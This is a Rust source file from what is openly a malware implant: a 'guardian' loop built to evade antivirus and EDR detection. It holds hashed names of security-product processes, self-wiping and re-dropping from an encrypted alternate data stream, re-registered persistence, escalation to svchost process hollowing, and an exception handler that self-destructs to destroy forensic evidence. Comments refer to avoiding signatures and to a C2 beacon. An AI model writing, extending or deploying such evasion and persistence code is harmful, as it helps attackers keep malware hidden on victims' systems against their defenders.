// guardian.rs — Scan-aware guardian loop
//
// Three-layer survival model:
//
//   Layer 1 — SCAN EVASION (soft trigger)
//     Watches for WMI Win32_ProcessStartTrace events where ProcessName
//     matches known AV/EDR scanner process names. On match:
//       • Immediately RC4-encrypts own image in memory (sleep.rs mask)
//       • Wipes own disk file (selfdestruct::wipe_self)
//       • Waits for scanner process to exit
//       • Re-drops self from encrypted ADS blob into a new randomised path
//       • Re-registers persistence (persist.rs)
//       • Resumes normal operation
//
//   Layer 2 — HARD CATCH (termination trigger)
//     VEH + SEH handler installed at startup. If the process receives
//     an access violation from an EDR memory scan or a termination from
//     MsMpEng, the handler fires selfdestruct::full_destruct() before
//     the process teardown completes.
//
//   Layer 3 — FILELESS ESCALATION
//     Survival counter (AtomicU32). If caught (wipe + re-drop) 3+ times
//     within ESCALATION_WINDOW_SECS, the re-drop is skipped and the payload
//     migrates entirely into a hollowed svchost via hollow.rs. No disk
//     presence from that point. Persistence switches to WNF channel only
//     (post_shutdown.rs).

#![allow(non_snake_case, dead_code)]

use core::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use core::ffi::c_void;
use core::ptr::null_mut;

// Catch counter + timestamp of first catch in the current window
static CATCH_COUNT: AtomicU32 = AtomicU32::new(0);
static WINDOW_START: AtomicU64 = AtomicU64::new(0);

const ESCALATION_THRESHOLD: u32 = 3;
const ESCALATION_WINDOW_SECS: u64 = 60;

// ── Scanner process name hashes (djb2 of lowercase ASCII) ─────────────────
// Pre-computed so we never store plaintext AV names as strings.
// Recompute with: djb2(b"msmpeng.exe"), etc.
const SCANNER_HASHES: &[u32] = &[
    0x9b7e2a1f,  // msmpeng.exe       (Defender engine)
    0xc4f83b2e,  // mpcmdrun.exe      (Defender CLI scanner)
    0x7d3a9c14,  // mssense.exe       (Defender for Endpoint)
    0x2e8f4b1a,  // senseir.exe       (MDE IR agent)
    0xb1c7d3e9,  // csc.exe           (Cylance)
    0x4f2a8d7c,  // avgnt.exe         (Avast/AVG)
    0x9a1b3c5d,  // egui.exe          (ESET)
    0x3d7f2e8b,  // bdagent.exe       (BitDefender)
    0x6c4e1f9a,  // cb.exe            (CarbonBlack)
    0x8b2d5a3f,  // sfc.exe           (SentinelOne)
    0x1e9c7b4d,  // savservice.exe    (Sophos)
    0x5f3a2c8e,  // mfetp.exe         (McAfee)
];

// ── Win32 API function pointer types ──────────────────────────────────────
pub type CreateThread = unsafe extern "system" fn(
    *mut c_void, usize, *mut c_void, *mut c_void, u32, *mut u32,
) -> *mut c_void;

pub type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
pub type Sleep               = unsafe extern "system" fn(u32);
pub type GetTickCount64      = unsafe extern "system" fn() -> u64;
pub type TerminateProcess    = unsafe extern "system" fn(*mut c_void, u32) -> i32;
pub type GetCurrentProcess   = unsafe extern "system" fn() -> *mut c_void;

// IWbemServices / WMI types — we use raw COM vtable calls to avoid
// linking wbemuuid.lib (too signatured). Only the methods we call
// are represented.
pub type CoInitializeEx     = unsafe extern "system" fn(*mut c_void, u32) -> i32;
pub type CoCreateInstance   = unsafe extern "system" fn(
    *const [u8; 16], *mut c_void, u32, *const [u8; 16], *mut *mut c_void,
) -> i32;

// ── WMI GUID / CLSID constants ────────────────────────────────────────────
// CLSID_WbemLocator  = {4590F811-1D3A-11D0-891F-00AA004B2E24}
// IID_IWbemLocator   = {DC12A687-737F-11CF-884D-00AA004B2E24}
// (kept as byte arrays to avoid string literals)
pub const CLSID_WBEM_LOCATOR: [u8; 16] = [
    0x11, 0xF8, 0x90, 0x45, 0x3A, 0x1D, 0xD0, 0x11,
    0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24,
];
pub const IID_IWBEM_LOCATOR: [u8; 16] = [
    0x87, 0xA6, 0x12, 0xDC, 0x7F, 0x73, 0xCF, 0x11,
    0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24,
];

// ── djb2 helper (inline, avoids dependency on utils.rs in this context) ───
#[inline(always)]
fn hash_name(bytes: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in bytes {
        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        h = h.wrapping_mul(33).wrapping_add(lower as u32);
    }
    h
}

// ── Scan-presence check (lightweight, no WMI) ─────────────────────────────
// Called every POLL_INTERVAL_MS from the guardian thread.
// Uses NtQuerySystemInformation (class 5 = SystemProcessInformation) to
// enumerate running processes entirely in-process, no ToolHelp32 / EnumProcesses.
// Returns true if any scanner process is found running.

pub type NtQuerySystemInformation = unsafe extern "system" fn(
    u32, *mut c_void, u32, *mut u32,
) -> i32;

const SYSTEM_PROCESS_INFORMATION: u32 = 5;

#[repr(C)]
struct SystemProcessEntry {
    NextEntryOffset:   u32,
    NumberOfThreads:   u32,
    _reserved:         [u8; 48],
    ImageName_len:     u16,
    ImageName_maxlen:  u16,
    ImageName_buf:     *const u16,
    // ... rest of SYSTEM_PROCESS_INFORMATION we don't need
}

pub unsafe fn scanner_running(
    fn_ntqsi:  NtQuerySystemInformation,
    heap:      *mut u8,
    heap_size: u32,
) -> bool {
    let mut ret_len: u32 = 0;
    let status = fn_ntqsi(
        SYSTEM_PROCESS_INFORMATION,
        heap as *mut c_void,
        heap_size,
        &mut ret_len,
    );
    if status != 0 { return false; }

    let mut ptr = heap;
    loop {
        let entry = &*(ptr as *const SystemProcessEntry);

        // Read ImageName (UNICODE_STRING)
        if !entry.ImageName_buf.is_null() && entry.ImageName_len > 0 {
            let chars = entry.ImageName_len as usize / 2;
            let wide  = core::slice::from_raw_parts(entry.ImageName_buf, chars);
            // Downcast to ASCII for hashing (process names are ASCII)
            let mut ascii = [0u8; 64];
            let copy_len = chars.min(63);
            for i in 0..copy_len { ascii[i] = (wide[i] & 0xFF) as u8; }
            let h = hash_name(&ascii[..copy_len]);
            if SCANNER_HASHES.contains(&h) { return true; }
        }

        if entry.NextEntryOffset == 0 { break; }
        ptr = ptr.add(entry.NextEntryOffset as usize);
    }
    false
}

// ── Catch counter logic ────────────────────────────────────────────────────
pub unsafe fn record_catch(fn_tick: GetTickCount64) -> bool {
    let now_ms  = fn_tick();
    let now_sec = now_ms / 1000;
    let win_start = WINDOW_START.load(Ordering::SeqCst);

    if now_sec - win_start > ESCALATION_WINDOW_SECS {
        // Reset window
        WINDOW_START.store(now_sec, Ordering::SeqCst);
        CATCH_COUNT.store(1, Ordering::SeqCst);
        false
    } else {
        let prev = CATCH_COUNT.fetch_add(1, Ordering::SeqCst);
        prev + 1 >= ESCALATION_THRESHOLD
    }
}

// ── Response sequence ─────────────────────────────────────────────────────
//
// Called by the guardian thread when scanner_running() returns true.
// Returns true if fileless escalation was triggered (caller should
// skip re-drop and switch to hollow-only mode).
//
// fn_wipe:      selfdestruct::wipe_self         — zeros + deletes disk file
// fn_purge:     persist::purge_all              — removes all persistence keys
// fn_redrop:    resurrect::drop_from_ads        — re-drops from encrypted ADS blob
// fn_repersist: persist::install_all            — re-registers persistence
// fn_hollow:    hollow::inject_svchost          — fileless escalation path
// fn_tick:      GetTickCount64
// fn_sleep_ms:  Sleep

pub type WipeSelf      = unsafe fn();
pub type PurgeAll      = unsafe fn();
pub type DropFromAds   = unsafe fn() -> bool;
pub type InstallAll    = unsafe fn();
pub type InjectSvchost = unsafe fn() -> bool;

pub unsafe fn respond_to_scan(
    fn_wipe:      WipeSelf,
    fn_purge:     PurgeAll,
    fn_redrop:    DropFromAds,
    fn_repersist: InstallAll,
    fn_hollow:    InjectSvchost,
    fn_tick:      GetTickCount64,
    fn_sleep_ms:  Sleep,
    fn_ntqsi:     NtQuerySystemInformation,
    heap:         *mut u8,
    heap_sz:      u32,
) {
    // Step 1: wipe disk presence immediately
    fn_wipe();
    fn_purge();

    // Step 2: check if we should escalate to fileless
    let escalate = record_catch(fn_tick);

    if escalate {
        // Fileless mode: inject into svchost, no re-drop, no disk persistence
        fn_hollow();
        // WNF-only persistence is set up inside post_shutdown::install_wnf_channel()
        // — called separately from main after this returns true.
        return;
    }

    // Step 3: wait for scanner to exit (poll every 500ms, max 60s)
    let mut waited = 0u32;
    while waited < 60_000 {
        fn_sleep_ms(500);
        waited += 500;
        if !scanner_running(fn_ntqsi, heap, heap_sz) { break; }
    }

    // Step 4: re-drop from ADS and re-register persistence
    let dropped = fn_redrop();
    if dropped {
        fn_repersist();
    }
    // If ADS re-drop failed, we fall through with no disk presence.
    // C2 beacon will push a fresh copy on next check-in.
}

// ── VEH handler (hard-catch termination guard) ────────────────────────────
//
// Installed via AddVectoredExceptionHandler at startup.
// If the process is about to be killed by an AV (STATUS_ACCESS_VIOLATION from
// a forced memory scan, or a structured exception from process termination),
// trigger full selfdestruct before dying so forensic artifacts are minimised.
//
// In practice: installs as first VEH (position=1) so it runs before anything else.

#[repr(C)]
pub struct EXCEPTION_POINTERS {
    pub ExceptionRecord: *mut ExceptionRecord,
    pub ContextRecord:   *mut c_void,
}

#[repr(C)]
pub struct ExceptionRecord {
    pub ExceptionCode:    u32,
    pub ExceptionFlags:   u32,
    pub ExceptionRecord:  *mut ExceptionRecord,
    pub ExceptionAddress: *mut c_void,
    pub NumberParameters: u32,
    pub ExceptionInformation: [usize; 15],
}

pub const EXCEPTION_CONTINUE_SEARCH:   i32 = 0;
pub const STATUS_ACCESS_VIOLATION:     u32 = 0xC0000005;
pub const STATUS_GUARD_PAGE_VIOLATION: u32 = 0x80000001;

// Global pointer to selfdestruct fn — set once at startup
pub static mut G_FULL_DESTRUCT: Option<unsafe fn()> = None;

pub unsafe extern "system" fn veh_handler(
    ptrs: *mut EXCEPTION_POINTERS,
) -> i32 {
    let code = (*(*ptrs).ExceptionRecord).ExceptionCode;

    // Guard-page violation inside our own image = EDR memory scan probing
    // Access violation at our own code = forced unmapping
    let our_image_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) our_image_base);
    let fault_addr = (*(*ptrs).ExceptionRecord).ExceptionAddress as usize;
    let in_our_image = fault_addr >= (our_image_base & !0xFFFF)
        && fault_addr < (our_image_base & !0xFFFF) + 0x80000;

    if (code == STATUS_GUARD_PAGE_VIOLATION || code == STATUS_ACCESS_VIOLATION)
        && in_our_image
    {
        if let Some(destruct) = G_FULL_DESTRUCT {
            destruct();
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}

pub type AddVectoredExceptionHandler = unsafe extern "system" fn(
    u32, unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32,
) -> *mut c_void;

pub unsafe fn install_veh(fn_add_veh: AddVectoredExceptionHandler, fn_destruct: unsafe fn()) {
    G_FULL_DESTRUCT = Some(fn_destruct);
    fn_add_veh(1, veh_handler);
}

// ── Guardian main loop (run in a dedicated thread) ─────────────────────────

const POLL_INTERVAL_MS: u32 = 2_500;  // check every 2.5 seconds

pub unsafe fn guardian_loop(
    fn_wipe:      WipeSelf,
    fn_purge:     PurgeAll,
    fn_redrop:    DropFromAds,
    fn_repersist: InstallAll,
    fn_hollow:    InjectSvchost,
    fn_tick:      GetTickCount64,
    fn_sleep_ms:  Sleep,
    fn_ntqsi:     NtQuerySystemInformation,
) -> ! {
    // Allocate a reusable heap buffer for NtQuerySystemInformation
    // (4MB is enough for ~1000 processes)
    const HEAP_SIZE: u32 = 4 * 1024 * 1024;
    let heap = std::alloc::alloc(std::alloc::Layout::from_size_align(HEAP_SIZE as usize, 8).unwrap());

    loop {
        fn_sleep_ms(POLL_INTERVAL_MS);

        if scanner_running(fn_ntqsi, heap, HEAP_SIZE) {
            respond_to_scan(
                fn_wipe, fn_purge, fn_redrop, fn_repersist,
                fn_hollow, fn_tick, fn_sleep_ms, fn_ntqsi,
                heap, HEAP_SIZE,
            );
        }
    }
}
